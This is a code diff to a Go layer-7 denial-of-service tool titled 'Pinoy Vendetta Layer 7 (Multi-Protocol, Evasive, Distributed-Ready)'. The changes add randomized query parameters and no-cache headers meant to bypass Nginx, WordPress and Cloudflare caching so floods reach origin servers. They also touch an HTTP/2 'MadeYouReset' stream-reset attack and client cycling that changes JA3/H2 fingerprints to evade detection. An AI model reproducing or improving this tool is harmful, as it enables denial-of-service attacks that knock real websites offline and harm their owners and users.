@@ -129,6 +129,20 @@ var (
 	statusOkColor   = color.New(color.FgGreen)
 	statusWarnColor = color.New(color.FgYellow)
 	statusErrColor  = color.New(color.FgRed)
+
+	httpVersionColors = map[string]*color.Color{
+		"1.1": color.New(color.FgHiBlue),
+		"2":   color.New(color.FgHiMagenta),
+		"3":   color.New(color.FgHiCyan),
+	}
+	methodColors = map[string]*color.Color{
+		"GET":    color.New(color.FgHiGreen),
+		"POST":   color.New(color.FgHiYellow),
+		"HEAD":   color.New(color.FgHiBlue),
+		"PUT":    color.New(color.FgHiRed),
+		"DELETE": color.New(color.FgHiRed),
+		"PATCH":  color.New(color.FgHiMagenta),
+	}
 )
 
 func getRandomElement(slice []string) string {
@@ -178,9 +192,29 @@ func generateRandomPayload(format string) (io.Reader, string) {
 
 func randomPath(base string) string {
 	parsed, _ := url.Parse(base)
-	parsed.Path += "/" + fmt.Sprintf("%x", mathrand.Intn(0xfffff))
+	// Do NOT append random path segment - keep original path clean
+	// Only add heavy cache bypass query params
+
 	q := parsed.Query()
 	q.Set("v", fmt.Sprintf("%d", mathrand.Intn(99999)))
+
+	// Heavy caching bypass for Nginx, WordPress, Cloudflare
+	bypassParams := []string{"nocache", "bypass", "refresh", "cb", "cache_bust", "t", "_", "v2", "anti_cache"}
+	randomParam := getRandomElement(bypassParams)
+	q.Set(randomParam, fmt.Sprintf("%d", mathrand.Intn(999999999)))
+
+	if mathrand.Intn(2) == 0 {
+		q.Set("nginx_bypass", fmt.Sprintf("%x", mathrand.Intn(0xffffff)))
+	}
+	if mathrand.Intn(3) == 0 {
+		q.Set("wp_", fmt.Sprintf("%d", mathrand.Intn(999999)))
+		q.Set("doing_wp_cron", fmt.Sprintf("%d", time.Now().Unix()))
+	}
+	if mathrand.Intn(3) == 0 {
+		q.Set("cf_bypass", fmt.Sprintf("%x", mathrand.Intn(0xffffff)))
+		q.Set("__cf_chl_tk", fmt.Sprintf("%x", mathrand.Intn(0xffffff)))
+	}
+
 	parsed.RawQuery = q.Encode()
 	return parsed.String()
 }
@@ -288,10 +322,10 @@ func madeYouResetAttack(parentCtx context.Context, config *workerConfig, client 
 		var streamErr http2.StreamError
 		if errors.As(err, &streamErr) {
 			atomic.AddUint64(&madeYouResetSuccess, 1)
-			logMessage(statusOkColor.Sprintf("[H2-RESET] Success (Server Reset Stream)"))
+			logMessage(statusOkColor.Sprintf("[MYR] Success (Server Reset Stream)"))
 		} else if err != context.Canceled {
 			atomic.AddUint64(&madeYouResetErrors, 1)
-			logMessage(statusErrColor.Sprintf("[H2-RESET] Network Error: %v", err))
+			logMessage(statusErrColor.Sprintf("[MYR] Network Error: %v", err))
 		}
 	} else if resp != nil {
 		io.Copy(io.Discard, resp.Body)
@@ -454,7 +488,11 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 				client = buildHTTPClient(config, httpVersion)
 			}
 			burstsSinceLastCycle = 0
-			logMessage(fmt.Sprintf("[H%s] Client cycled (new JA3/H2 fingerprint)", httpVersion))
+			verColor := httpVersionColors[httpVersion]
+			if verColor == nil {
+				verColor = valueColor
+			}
+			logMessage(fmt.Sprintf("[%s] Client cycled (new JA3/H2 fingerprint)", verColor.Sprint("HTTP"+httpVersion)))
 		}
 
 		var burstCount int
@@ -495,6 +533,8 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 					randomHeaderName("Accept-Encoding"): getRandomElement(acceptEncodings),
 					randomHeaderName("Connection"):      "keep-alive",
 					randomHeaderName("Cookie"):          generateRandomCookies(),
+					randomHeaderName("Cache-Control"):   "no-cache, no-store, must-revalidate, max-age=0",
+					randomHeaderName("Pragma"):          "no-cache",
 				}
 				if contentType != "" {
 					headerSet[randomHeaderName("Content-Type")] = contentType
@@ -524,7 +564,11 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 
 				if err != nil {
 					if err != context.Canceled {
-						logMessage(fmt.Sprintf("[H%s] Client Error: %v", httpVersion, err))
+						verColor := httpVersionColors[httpVersion]
+						if verColor == nil {
+							verColor = valueColor
+						}
+						logMessage(fmt.Sprintf("[%s] Client Error: %v", verColor.Sprint("HTTP"+httpVersion), err))
 						recordError("client_error")
 					}
 					if config.retry && isTransientErr(err) {
@@ -579,7 +623,26 @@ func worker(ctx context.Context, wg *sync.WaitGroup, config *workerConfig, httpV
 				if !ok {
 					statusText = "Unknown"
 				}
-				logMessage(fmt.Sprintf("[H%s] %s -> %d %s (%dms)", httpVersion, reqURL, resp.StatusCode, statusText, latency))
+
+				// Colored log
+				verColor := httpVersionColors[httpVersion]
+				if verColor == nil {
+					verColor = valueColor
+				}
+				methColor := methodColors[method]
+				if methColor == nil {
+					methColor = headerColor
+				}
+				urlColor := color.New(color.FgWhite)
+
+				logMsg := fmt.Sprintf("[%s] %s %s -> %d %s (%dms)",
+					verColor.Sprint("HTTP"+httpVersion),
+					methColor.Sprint(method),
+					urlColor.Sprint(reqURL),
+					resp.StatusCode,
+					statusText,
+					latency)
+				logMessage(logMsg)
 
 				if i < burstCount-1 {
 					pacingDelay := time.Duration(50+mathrand.Intn(200)) * time.Millisecond
@@ -651,10 +714,13 @@ func printProgress(endTime, startTime time.Time, config *workerConfig) {
 	if resRec > 0 {
 		avgLatency = float64(atomic.LoadInt64(&totalLatency)) / float64(resRec)
 	}
+	_ = rps
+	_ = avgLatency
 
 	sb.WriteString(titleColor.Sprint("--- Pinoy Vendetta Layer 7 (Multi-Protocol, Evasive, Distributed-Ready) ---\n"))
 	sb.WriteString(headerColor.Sprint("---------------------------------------------------------------------------------------------------------------------------------------------------------------\n"))
 
+	// Left column
 	left := []string{
 		fmt.Sprintf("%-25s %s", "Random UA:", statusString(true)),
 		fmt.Sprintf("%-25s %s", "Random IP:", statusString(config.ipRandom)),
@@ -852,6 +918,15 @@ func main() {
 		}
 		parsedURL.Host = net.JoinHostPort(host, *portPtr)
 		finalURL = parsedURL.String()
+	}
+
+	// Ensure root path "/" when random-path is enabled and no path was provided
+	// This prevents 404s when appending query parameters to bare host URLs like "http://mysite.com"
+	if *pathRandPtr {
+		if parsedURL.Path == "" {
+			parsedURL.Path = "/"
+			finalURL = parsedURL.String()
+		}
 	}
 
 	methods := strings.Split(*methodsPtr, ",")
